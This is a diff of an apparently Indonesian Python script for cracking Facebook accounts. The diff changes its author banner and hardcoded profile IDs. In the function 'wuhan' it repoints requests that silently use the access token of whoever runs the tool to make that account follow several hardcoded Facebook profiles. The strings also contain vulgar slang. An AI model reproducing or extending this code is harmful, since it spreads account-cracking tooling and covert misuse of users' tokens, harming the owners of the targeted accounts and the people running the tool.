@@ -68,8 +68,8 @@ id = []
 user = []
 num = 0
 loop = 0
-xi_jimpinx = '1714000985456399'
-koh = '100005395413800'
+xi_jimpinx = '953529338576547'
+koh = '100017584682867'
 url = "https://mbasic.facebook.com"
 hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
@@ -92,9 +92,9 @@ def tod():
 logo = ''' \033[0;96m __  __        __  ______  ____
  \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By ☆RAKA☆™︻®╤───────═◍➤
  \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Bangsat-XD
- \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/AA.RAKA2708'''
+ \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/GARANGAN.KECHE'''
 
-lo_ngentod = '1714009362122228'
+lo_ngentod = '953529338576547'
 # crack selesai
 def hasil(ok,cp):
     if len(ok) != 0 or len(cp) != 0:
@@ -212,7 +212,7 @@ def bangsat_xd():
 def wuhan(kontol):
     try:
         kentod = kontol
-        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
